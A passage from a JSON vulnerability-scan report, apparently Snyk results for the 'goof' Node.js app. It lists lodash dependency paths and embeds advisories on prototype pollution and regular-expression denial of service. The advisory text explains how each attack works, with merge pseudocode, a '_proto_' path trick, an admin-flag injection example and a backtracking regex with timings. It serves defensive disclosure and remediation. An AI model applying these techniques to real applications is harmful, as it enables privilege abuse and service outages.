              "code_desc": "From : [ goof@1.0.1 , lodash@4.17.4 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-generator@6.26.1 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-traverse@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-generator@6.26.1 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-traverse@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-traverse@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-traverse@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2018-16487"
            ],
            "ghsaid": [
              "4xc9-xhrj-v574"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-LODASH-73638",
          "desc": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The functions `merge`, `mergeWith`, and `defaultsDeep` could be tricked into adding or modifying properties of `Object.prototype`. This is due to an incomplete fix to `CVE-2018-3721`.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `lodash` to version 4.17.11 or higher.\n## References\n- [GitHub Commit](https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad)\n- [GitHub PR](https://github.com/lodash/lodash/pull/4337)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1066)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1068)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1071)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/782)\n- [POC: HackerOne Report](https://hackerone.com/reports/380873)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2019-02-03T09:06:37.726000Z\",\n  \"credit\": [\n    \"asgerf\"\n  ],\n  \"cvssScore\": 7.3,\n  \"description\": \"## Overview\\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. The functions `merge`, `mergeWith`, and `defaultsDeep` could be tricked into adding or modifying properties of `Object.prototype`. This is due to an incomplete fix to `CVE-2018-3721`.\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `lodash` to version 4.17.11 or higher.\\n## References\\n- [GitHub Commit](https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad)\\n- [GitHub PR](https://github.com/lodash/lodash/pull/4337)\\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1066)\\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1068)\\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1071)\\n- [NPM Security Advisory](https://www.npmjs.com/advisories/782)\\n- [POC: HackerOne Report](https://hackerone.com/reports/380873)\\n\",\n  \"disclosureTime\": \"2018-08-31T18:21:00Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"4.17.11\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"merge\"\n      },\n      \"version\": [\n        \">=0.9.0 <1.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"dist/lodash.js\",\n        \"functionName\": \"merge\"\n      },\n      \"version\": [\n        \">=1.0.0 <1.0.3\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"dist/lodash.js\",\n        \"functionName\": \"runInContext.merge\"\n      },\n      \"version\": [\n        \">=1.1.0 <2.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"runInContext.merge\"\n      },\n      \"version\": [\n        \">=2.0.0 <3.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"index.js\",\n        \"functionName\": \"runInContext.baseMerge\"\n      },\n      \"version\": [\n        \">=3.0.0 <4.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"index.js\",\n        \"functionName\": \"runInContext.baseMergeDeep\"\n      },\n      \"version\": [\n        \">=3.0.0 <4.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"runInContext.mergeDefaults\"\n      },\n      \"version\": [\n        \">=4.0.0 <4.17.3\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"runInContext.assignMergeValue\"\n      },\n      \"version\": [\n        \">=4.0.0 <4.17.5\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"runInContext.baseMerge\"\n      },\n      \"version\": [\n        \">=4.0.0 <4.17.5\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"runInContext.baseMergeDeep\"\n      },\n      \"version\": [\n        \">=4.0.0 <4.17.5\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"safeGet\"\n      },\n      \"version\": [\n        \">=4.17.5 <4.17.11\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"merge\"\n      },\n      \"version\": [\n        \">=0.9.0 <1.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"dist/lodash.js\",\n        \"functionName\": \"merge\"\n      },\n      \"version\": [\n        \">=1.0.0 <1.0.3\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"dist/lodash.js\",\n        \"functionName\": \"runInContext.merge\"\n      },\n      \"version\": [\n        \">=1.1.0 <2.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"runInContext.merge\"\n      },\n      \"version\": [\n        \">=2.0.0 <3.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"index.js\",\n        \"functionName\": \"runInContext.baseMerge\"\n      },\n      \"version\": [\n        \">=3.0.0 <4.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"index.js\",\n        \"functionName\": \"runInContext.baseMergeDeep\"\n      },\n      \"version\": [\n        \">=3.0.0 <4.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"runInContext.mergeDefaults\"\n      },\n      \"version\": [\n        \">=4.0.0 <4.17.3\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"runInContext.assignMergeValue\"\n      },\n      \"version\": [\n        \">=4.0.0 <4.17.5\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"runInContext.baseMerge\"\n      },\n      \"version\": [\n        \">=4.0.0 <4.17.5\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"runInContext.baseMergeDeep\"\n      },\n      \"version\": [\n        \">=4.0.0 <4.17.5\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"safeGet\"\n      },\n      \"version\": [\n        \">=4.17.5 <4.17.11\"\n      ]\n    }\n  ],\n  \"id\": \"SNYK-JS-LODASH-73638\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2018-16487\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-4xc9-xhrj-v574\"\n    ],\n    \"NSP\": [\n      \"1066\",\n      \"1068\",\n      \"1071\",\n      \"782\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-04-05T12:27:17.510305Z\",\n  \"moduleName\": \"lodash\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"lodash\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2019-02-01T18:21:00Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/lodash/lodash/pull/4337\"\n    },\n    {\n      \"title\": \"NPM Security Advisory\",\n      \"url\": \"https://www.npmjs.com/advisories/1066\"\n    },\n    {\n      \"title\": \"NPM Security Advisory\",\n      \"url\": \"https://www.npmjs.com/advisories/1068\"\n    },\n    {\n      \"title\": \"NPM Security Advisory\",\n      \"url\": \"https://www.npmjs.com/advisories/1071\"\n    },\n    {\n      \"title\": \"NPM Security Advisory\",\n      \"url\": \"https://www.npmjs.com/advisories/782\"\n    },\n    {\n      \"title\": \"POC: HackerOne Report\",\n      \"url\": \"https://hackerone.com/reports/380873\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<4.17.11\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"lodash@4.17.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"lodash@4.17.11\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"lodash\",\n  \"version\": \"4.17.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , lodash@4.17.4 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-generator@6.26.1 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-traverse@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-generator@6.26.1 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-traverse@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-traverse@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-instrument@1.10.1 , babel-template@6.26.0 , babel-traverse@6.26.0 , babel-types@6.26.0 , lodash@4.17.10 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-003173",
              "CCI-001643"
            ],
            "nist": [
              "SA-11",
              "RA-5"
            ],
            "cweid": [
              "185"
            ],
            "cveid": [
              "2019-1010266"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "SNYK-JS-LODASH-73639",
          "desc": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). It parses dates using regex strings, which may cause a slowdown of 2 seconds per 50k characters.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `lodash` to version 4.17.11 or higher.\n## References\n- [GitHub Commit](https://github.com/lodash/lodash/commit/5c08f18d365b64063bfbfa686cbb97cdd6267347)\n- [GitHub PR](https://github.com/lodash/lodash/pull/4450)\n- [POC: GitHub Issue](https://github.com/lodash/lodash/issues/3359)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H/E:P\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2019-02-03T09:18:05.060741Z\",\n  \"credit\": [\n    \"cristianstaicu\"\n  ],\n  \"cvssScore\": 4.4,\n  \"description\": \"## Overview\\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). It parses dates using regex strings, which may cause a slowdown of 2 seconds per 50k characters.\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `lodash` to version 4.17.11 or higher.\\n## References\\n- [GitHub Commit](https://github.com/lodash/lodash/commit/5c08f18d365b64063bfbfa686cbb97cdd6267347)\\n- [GitHub PR](https://github.com/lodash/lodash/pull/4450)\\n- [POC: GitHub Issue](https://github.com/lodash/lodash/issues/3359)\\n\",\n  \"disclosureTime\": \"2017-09-05T09:14:29Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"4.17.11\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"hasUnicodeWord\"\n      },\n      \"version\": [\n        \">=4.15.0 <4.17.11\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"lodash.js\",\n        \"functionName\": \"hasUnicodeWord\"\n      },\n      \"version\": [\n        \">=4.15.0 <4.17.11\"\n      ]\n    }\n  ],\n  \"id\": \"SNYK-JS-LODASH-73639\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2019-1010266\"\n    ],\n    \"CWE\": [\n      \"CWE-185\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": 